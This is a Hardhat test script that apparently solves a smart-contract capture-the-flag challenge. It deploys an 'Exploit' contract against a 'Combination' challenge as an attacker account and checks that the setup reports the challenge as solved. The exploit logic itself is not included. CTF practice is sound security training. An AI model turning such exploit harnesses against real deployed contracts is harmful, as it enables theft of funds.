import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { expect } from "chai";
import { SETUP_saianmk, CHALLENGE_saianmk } from "../../scripts/addresses"

let accounts: Signer[];
let attacker: Signer;
let attackerAddress: string;
let exploit: Contract;
let setup: Contract;
let challenge: Contract;
let tx: any;

before(async () => {
    [attacker] = await ethers.getSigners();
    attackerAddress = await attacker.getAddress();
    setup = (await ethers.getContractAt(`contracts/saianmk/Setup.sol:Setup`, SETUP_saianmk)).connect(attacker);
    challenge = (await ethers.getContractAt(`contracts/saianmk/Combination.sol:Combination`, CHALLENGE_saianmk)).connect(attacker);
});

it("prints contract address", async function () {
    expect(await setup.combination()).to.eq(CHALLENGE_saianmk);
});

it("exploit", async () => {
    exploit = await (await ethers.getContractFactory(`contracts/saianmk/Exploit.sol:Exploit`, attacker)).deploy(challenge.address);
    await exploit.finalize();
    expect(await setup.isSolved()).to.eq(true);
});